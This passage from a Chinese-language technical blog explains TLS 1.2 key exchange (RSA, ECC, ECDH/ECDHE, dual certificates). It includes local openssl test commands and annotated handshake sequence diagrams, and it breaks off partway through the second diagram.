<h3 id="1-2-rsa密钥交换"><a href="#1-2-rsa密钥交换" class="headerlink" title="1.2. rsa密钥交换"></a>1.2. rsa密钥交换</h3><ul>
<li>客户端产生预主密钥，使用服务端下发的公钥加密后发给服务端</li>
<li>服务端拿到后，用私钥解密</li>
<li>双方使用客户端随机数、服务端随机数、预主密钥产生会话密钥通信</li>
</ul>
<p><strong>问题</strong></p>
<ul>
<li>服务端的私钥如果泄漏，会导致预主密钥泄漏，就可以推断出会话密钥</li>
</ul>
<h3 id="1-3-ECC密钥交换"><a href="#1-3-ECC密钥交换" class="headerlink" title="1.3. ECC密钥交换"></a>1.3. ECC密钥交换</h3><ul>
<li>同rsa，客户端产生预主密钥，使用服务端下发的公钥加密后发给服务端</li>
</ul>
<h3 id="1-4-ECDH密钥交换"><a href="#1-4-ECDH密钥交换" class="headerlink" title="1.4. ECDH密钥交换"></a>1.4. ECDH密钥交换</h3><ol>
<li>本质上是根据<a href="/blogs/2022-03-23-cryptography/#3-ECDHE%E7%AE%97%E6%B3%95">ECC椭圆曲线</a>的算法</li>
<li>双方首选选择一个椭圆曲线和基点G</li>
<li>一方生成随机数 $d_1$ 作为私钥，发送给另一方公钥 $Q_1 &#x3D; d_1G$</li>
<li>同理对方生成随机数 $d_2$ 作为私钥，发送给另一方公钥 $Q_2 &#x3D; d_2G$</li>
<li>由于当前算力无法推出 $d_1$ 和 $d_2$，所以双方可以直接计算出相同的一个值 $d_1d_2G$ 作为预主密钥</li>
</ol>
<p><strong>如何解决rsa的问题</strong></p>
<ul>
<li>中间数据传输只有双方的公钥，无法计算出各自的私钥，也无法推断预主密钥</li>
<li>就算一方私钥泄漏，也不会影响下一次连接，因为私钥是每次重新生成的</li>
</ul>
<h3 id="1-5-双证书体系"><a href="#1-5-双证书体系" class="headerlink" title="1.5. 双证书体系"></a>1.5. 双证书体系</h3><ul>
<li>双证书一般是ukey里面放了一个加密证书和一个签名证书</li>
<li>签名证书只能用于签名数据，加密证书是用来加密或生成对称加密密钥使用的</li>
</ul>
<h4 id="1-客户端ukey"><a href="#1-客户端ukey" class="headerlink" title="1) 客户端ukey"></a>1) 客户端ukey</h4><ul>
<li>做双向认证时，在Certificate请求构造需要提交签名证书和加密证书，签名证书在加密证书前面</li>
<li>由于不存在服务端使用客户端公钥加密一段数据给客户端自己解密使用，所以加密证书是用来生成对称加密密钥使用的<ul>
<li>RSA和ECC密钥交换，由于预主密钥是客户端直接生成给到服务端的，所以不使用加密证书</li>
<li>ECDHE密钥交换，只能是ECC的加密证书才参与生成</li>
<li>DHE密钥交换，只能是RSA的加密证书才参与生成</li>
</ul>
</li>
</ul>
<h2 id="2-重协商流程"><a href="#2-重协商流程" class="headerlink" title="2. 重协商流程"></a>2. 重协商流程</h2><img src="2022-01-24-01.png" />

<ul>
<li>199.200.2.170是服务端ip</li>
</ul>
<h2 id="3-tls1-2-rsa密钥交换握手过程-Cipher-Suite-TLS-RSA-WITH-AES-256-GCM-SHA384-0x009d"><a href="#3-tls1-2-rsa密钥交换握手过程-Cipher-Suite-TLS-RSA-WITH-AES-256-GCM-SHA384-0x009d" class="headerlink" title="3. tls1.2 rsa密钥交换握手过程 Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)"></a>3. tls1.2 rsa密钥交换握手过程 <code>Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)</code></h2><ul>
<li>下图使用openssl命令测试得到，生成的test.log可以放到wireshark解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端</span></span><br><span class="line">openssl s_server -accept 7777 -state -debug -key domain.key -cert domain.crt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -tls1_2 -cipher RSA -keylogfile test.log</span><br></pre></td></tr></table></figure>

<img src="2023-03-24-04.png" />

<ul>
<li>使用RSA做密钥交换，使用RSA做身份认证，使用AES256-GCM做对称加密，使用SHA384做摘要算法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; openssl ciphers -V | grep -i &#x27;0x00,0x9d&#x27;</span><br><span class="line">0x00,0x9D - AES256-GCM-SHA384       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(256) Mac=AEAD</span><br></pre></td></tr></table></figure>

<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="1155px" preserveAspectRatio="none" style="width:1334px;height:1155px;background:#FFFFFF;" version="1.1" viewBox="0 0 1334 1155" width="1334px" zoomAndPan="magnify" class="kroki">$2<defs/><g><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="413" x2="413" y1="36.2969" y2="1120.0703"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="913" x2="913" y1="36.2969" y2="1120.0703"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="388" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="395" y="24.9951">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="388" y="1119.0703"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="395" y="1139.0654">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="885" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="892" y="24.9951">server</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="885" y="1119.0703"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="892" y="1139.0654">server</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1327" x="0" y="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1327" y1="66.8633" y2="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1327" y1="69.8633" y2="69.8633"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="91" x="618" y="56.2969"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="72" x="624" y="72.3638">ssl&#25569;&#25163;&#38454;&#27573;</text><polygon fill="#181818" points="901.5,106.5625,911.5,110.5625,901.5,114.5625,905.5,110.5625" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="413.5" x2="907.5" y1="110.5625" y2="110.5625"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="72" x="420.5" y="105.4966">Client Hello</text><path d="M190,123.5625 L190,299.5625 L637,299.5625 L637,133.5625 L627,123.5625 L190,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M627,123.5625 L627,133.5625 L637,133.5625 L627,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="68" x="196" y="140.6294">client hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="196" y="155.7622">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="426" x="196" y="170.895">Version: TLS 1.0 (0x0301)   &#36825;&#20010;&#21487;&#20197;&#24573;&#30053;&#65292;Handshake&#40664;&#35748;&#23601;&#26159;tls1.0</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="204" x="196" y="186.0278">Handshake Type: Client Hello(1)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="317" x="212" y="201.1606">Version: TLS 1.2 (0x0303)  &#23458;&#25143;&#31471;&#25903;&#25345;&#30340;&#26368;&#39640;tls&#29256;&#26412;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167" x="212" y="216.2935">&#31639;&#27861;&#22871;&#20214;&#20449;&#24687; Cipher Suites</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="377" x="228" y="231.4263">&#21253;&#21547;&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#12289;&#36523;&#20221;&#35748;&#35777;&#31639;&#27861;&#12289;&#23545;&#31216;&#21152;&#23494;&#31639;&#27861;&#12289;&#20449;&#24687;&#25688;&#35201;&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="212" y="246.5591">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="228" y="261.6919">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="254" x="212" y="276.8247">&#35831;&#27714;&#30340;&#26381;&#21153;&#21517; Extension: server_name(0)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="339" x="212" y="291.9575">&#31614;&#21517;&#21704;&#24076;&#31639;&#27861;&#21015;&#34920; Extension: signature_algorithms(13)</text><polygon fill="#181818" points="424.5,322.1563,414.5,326.1563,424.5,330.1563,420.5,326.1563" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="418.5" x2="912.5" y1="326.1563" y2="326.1563"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="275" x="430.5" y="321.0903">Server Hello, Certificate, Server Hello Done</text><path d="M758,339.1563 L758,485.1563 L1068,485.1563 L1068,349.1563 L1058,339.1563 L758,339.1563 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1058,339.1563 L1058,349.1563 L1068,349.1563 L1058,339.1563 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="764" y="356.2231">Server Hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="764" y="371.356">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="210" x="764" y="386.4888">Handshake Type: Server Hello(2)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="119" x="764" y="401.6216">&#30830;&#23450;tls&#29256;&#26412; Version</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="764" y="416.7544">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="780" y="431.8872">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="108" x="764" y="447.02">&#20250;&#35805;id Session ID</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="273" x="780" y="462.1528">&#29992;&#20110;&#22797;&#29992;&#20250;&#35805;&#65292;&#23458;&#25143;&#31471;&#24102;&#20102;&#23601;&#22797;&#29992;&#65292;&#21542;&#21017;&#23601;&#26032;&#24314;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="160" x="764" y="477.2856">&#30830;&#23450;&#31639;&#27861;&#22871;&#20214; Cipher Suite</text><path d="M800,495.3516 L800,580.3516 L1026,580.3516 L1026,505.3516 L1016,495.3516 L800,495.3516 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1016,495.3516 L1016,505.3516 L1026,505.3516 L1016,495.3516 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="806" y="512.4185">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="806" y="527.5513">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="806" y="542.6841">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="806" y="557.8169">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="822" y="572.9497">&#21253;&#21547;&#20027;&#39064;&#12289;&#20844;&#38053;&#12289;&#31614;&#21517;&#31639;&#27861;</text><path d="M775,591.0156 L775,661.0156 L1052,661.0156 L1052,601.0156 L1042,591.0156 L775,591.0156 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1042,591.0156 L1042,601.0156 L1052,601.0156 L1042,591.0156 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="116" x="781" y="608.0825">Server Hello Done</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="781" y="623.2153">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="256" x="781" y="638.3481">Handshake Type: Server Hello Done(14)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="781" y="653.481">server hello&#32467;&#26463;</text><polygon fill="#181818" points="901.5,683.6797,911.5,687.6797,901.5,691.6797,905.5,687.6797" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="413.5" x2="907.5" y1="687.6797" y2="687.6797"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="476" x="420.5" y="682.6138">Client Key Exchange, Change Cipher Spec, Enctypted Handshake Message</text><path d="M232,700.6797 L232,770.6797 L594,770.6797 L594,710.6797 L584,700.6797 L232,700.6797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M584,700.6797 L584,710.6797 L594,710.6797 L584,700.6797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="129" x="238" y="717.7466">Client Key Exchange</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="238" y="732.8794">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="269" x="238" y="748.0122">Handshake Type: Client Key Exchange(16)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="325" x="254" y="763.145">&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65292;&#20351;&#29992;&#26381;&#21153;&#31471;&#19979;&#21457;&#30340;&#20844;&#38053;&#21152;&#23494;&#19978;&#20256;&#21040;&#26381;&#21153;&#31471;</text><path d="M278,781.2109 L278,836.2109 L548,836.2109 L548,791.2109 L538,781.2109 L278,781.2109 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M538,781.2109 L538,791.2109 L548,791.2109 L538,781.2109 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="130" x="284" y="798.2778">Change Cipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="249" x="284" y="813.4106">Content Type: Change Cipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="300" y="828.5435">&#21578;&#30693;&#26381;&#21153;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M5,846.6094 L5,901.6094 L823,901.6094 L823,856.6094 L813,846.6094 L5,846.6094 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M813,846.6094 L813,856.6094 L823,856.6094 L813,846.6094 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="196" x="11" y="863.6763">Enctyped Handshake Message</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="11" y="878.8091">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="781" x="27" y="893.9419">&#20351;&#29992;&#23458;&#25143;&#31471;DH&#21442;&#25968;&#12289;&#26381;&#21153;&#31471;DH&#21442;&#25968;&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#23458;&#25143;&#31471;&#38543;&#26426;&#25968;&#12289;&#26381;&#21153;&#31471;&#38543;&#26426;&#25968;&#12289;&#39044;&#20027;&#23494;&#38053;&#29983;&#25104;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#20027;&#23494;&#38053;&#21457;&#36865;&#21152;&#23494;&#25968;&#25454;</text><polygon fill="#181818" points="424.5,924.1406,414.5,928.1406,424.5,932.1406,420.5,928.1406" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="418.5" x2="912.5" y1="928.1406" y2="928.1406"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="347" x="430.5" y="923.0747">Change Chipher Spec, Enctypted Handshake Message</text><path d="M774,941.1406 L774,996.1406 L1052,996.1406 L1052,951.1406 L1042,941.1406 L774,941.1406 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1042,941.1406 L1042,951.1406 L1052,951.1406 L1042,941.1406 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="780" y="958.2075">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="780" y="973.3403">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="796" y="988.4731">&#21578;&#30693;&#23458;&#25143;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M504,1006.5391 L504,1061.5391 L1322,1061.5391 L1322,1016.5391 L1312,1006.5391 L504,1006.5391 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1312,1006.5391 L1312,1016.5391 L1322,1016.5391 L1312,1006.5391 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="196" x="510" y="1023.606">Enctyped Handshake Message</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="510" y="1038.7388">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="781" x="526" y="1053.8716">&#20351;&#29992;&#23458;&#25143;&#31471;DH&#21442;&#25968;&#12289;&#26381;&#21153;&#31471;DH&#21442;&#25968;&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#23458;&#25143;&#31471;&#38543;&#26426;&#25968;&#12289;&#26381;&#21153;&#31471;&#38543;&#26426;&#25968;&#12289;&#39044;&#20027;&#23494;&#38053;&#29983;&#25104;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#20027;&#23494;&#38053;&#21457;&#36865;&#21152;&#23494;&#25968;&#25454;</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1327" x="0" y="1087.5039"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1327" y1="1087.5039" y2="1087.5039"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1327" y1="1090.5039" y2="1090.5039"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="117" x="605" y="1076.9375"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="98" x="611" y="1093.0044">&#24320;&#22987;ssl&#25968;&#25454;&#20256;&#36755;</text><!--SRC=[vLPTJzfG6BxlhpYN9T45TDc5YTwWcSlcpNIxNHeyasPO2AsBtg7P3A8CdJhmQmeHDLCfPfjZ1VN7hEUqlTfVsDkUKggWYTwEczBtl5_dUPxtJHD2KX4ZOaAG51I9YLXIk8JF9EFaUvpakFv-9CincYlIXKMhS4uhFr5_FyUnYEu1vjQ7miux6iQnM9oJuWf6SR0t4xC7YZgduRYas6zZCmdSXuO5QLoE2kymtzCJu5xZf2p6fJuqzc8KXHu54H-S3lO6Gm64a7creTU-aPogrylawi9OB_zjB7dXLhrWLlP9zOmML2KcGopddRcb_3toeG07ET6DWZrkmLueI2ebclvb7AjqJQLBiyRc1xgTieuBaDrOIDFj4oU1KSdJx-kadDVhv_fLaSwgA2mced3tqIbHmRBZPF_8qaUoV4pKUUjpMTVsQRR4Gl-aPatjMAzVGFkcEkiPYVhREAoIp1w4U4PMWQuKp0FNqyblRURejaRNg-Wbt3a-sIgwa2LRMpPiftapCwVNjASZO-YL94xJ_BcL_m48aj9Nqj3S3Ab39zHKVz6pEUV6MP8fakKi6fe6qXXKZFCtaZ29-I23qJYz12UocYQr9HUHTDui7bqB4oSaGPbAuZT2R2AU59NefCo7UWCSbiQHBHcEOvcx1vXU-j2eyyuOwq9X3F9yAqO41NTTEqA3SGdxLETgr-zof-fk2iKVoCEvKQoGogR7UrCqN4VO7m2vtjWqrHrn70hBTcBqR92XkdQaQv_8VjR-u_ZOmKrPajg1his3ufc3VRHyGD8RzWnygPAwvlRjL-WrRRQ0RuFE1_MzaFF5yI4OCRssI78hJ4NGCkXR_tt0jSP1hzMjKi5M-ySJc0lumvJaQlls1jlfVoZ1JZGVUXnmrSUsb55VfJkxFcdUil2UundGU2GgI1CWoh3pz41Eu4WN6f8Yoan2mUEjdj08y2nCuFP5sI7h_V1lZ-T3JzmPNTkbwMMhz050Psi89ADVN85sF88ONp3uZ0-sVVHQHc_iaNJLS-j4JFC6RH3Sk42x0z_ZRX6oaZ5soruLkxtQehLJiXVHUfLcAx3rt9Qq-JjwO91tHFmkCEqM61xUZ0qEazmSr0PXUcqrRPtmtBeHxsq8VmA_qH_E4hPdyon0ZPLo4M20tB4xcpX7xo_6vX9ept0Bbz5RoVIGk3-PRXV_9PdmrKKQANAuQ7zxEOSmWURbgltjzGy0]--></g></svg>

<ul>
<li>密钥交换就是RSA的密钥交换过程</li>
<li>身份认证在服务端下发Certificate时，客户端会根据是否授信防中间人攻击；而预主密钥又使用了服务端的公钥进行加密传输，只有持有私钥的服务端才能拿到预主密钥，这里也是身份认证的关键</li>
<li>对称加密和摘要算法就都一样</li>
</ul>
<h2 id="4-TLS1-2-ecdhe握手流程-Cipher-Suite-TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384-0xc030"><a href="#4-TLS1-2-ecdhe握手流程-Cipher-Suite-TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384-0xc030" class="headerlink" title="4. TLS1.2 ecdhe握手流程 Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)"></a>4. TLS1.2 ecdhe握手流程 <code>Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)</code></h2><ul>
<li>使用openssl命令测试，生成的test.log可以放到wireshark解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端</span></span><br><span class="line">openssl s_server -accept 7777 -state -debug -key domain.key -cert domain.crt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -tls1_2 -cipher ECDHE -keylogfile test.log</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; openssl ciphers -V | grep -i &#x27;0xc0,0x30&#x27;</span><br><span class="line">0xC0,0x30 - ECDHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH     Au=RSA  Enc=AESGCM(256) Mac=AEAD</span><br></pre></td></tr></table></figure>

<ul>
<li>使用ECDHE进行密钥交换，RSA做身份认证，AES256-GCM作为对称加密套件，SHA384作为摘要算法</li>
<li>ECDHE_RSA是在ECDHE上加了RSA的签名（身份验证），服务端下发keyExchange时会把公钥用RSA私钥签名一下发下来，客户端会使用公钥验证一下签名正确</li>
</ul>
<img src="2023-03-21-02.png" />

<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="1276px" preserveAspectRatio="none" style="width:1342px;height:1276px;background:#FFFFFF;" version="1.1" viewBox="0 0 1342 1276" width="1342px" zoomAndPan="magnify" class="kroki">$2<defs/><g><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="413" x2="413" y1="36.2969" y2="1241.6016"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="921" x2="921" y1="36.2969" y2="1241.6016"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="388" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="395" y="24.9951">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="388" y="1240.6016"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="395" y="1260.5967">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="893" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="900" y="24.9951">server</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="893" y="1240.6016"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="900" y="1260.5967">server</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1335" x="0" y="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1335" y1="66.8633" y2="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1335" y1="69.8633" y2="69.8633"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="91" x="622" y="56.2969"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="72" x="628" y="72.3638">ssl&#25569;&#25163;&#38454;&#27573;</text><polygon fill="#181818" points="909.5,106.5625,919.5,110.5625,909.5,114.5625,913.5,110.5625" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="413.5" x2="915.5" y1="110.5625" y2="110.5625"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="72" x="420.5" y="105.4966">Client Hello</text><path d="M198,123.5625 L198,269.5625 L628,269.5625 L628,133.5625 L618,123.5625 L198,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M618,123.5625 L618,133.5625 L628,133.5625 L618,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="68" x="204" y="140.6294">client hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="204" y="155.7622">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="204" x="204" y="170.895">Handshake Type: Client Hello(1)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167" x="220" y="186.0278">&#31639;&#27861;&#22871;&#20214;&#20449;&#24687; Cipher Suites</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="377" x="236" y="201.1606">&#21253;&#21547;&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#12289;&#36523;&#20221;&#35748;&#35777;&#31639;&#27861;&#12289;&#23545;&#31216;&#21152;&#23494;&#31639;&#27861;&#12289;&#20449;&#24687;&#25688;&#35201;&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="220" y="216.2935">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="236" y="231.4263">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="254" x="220" y="246.5591">&#35831;&#27714;&#30340;&#26381;&#21153;&#21517; Extension: server_name(0)</text><text fill="#000000" font-family="sans-serif" 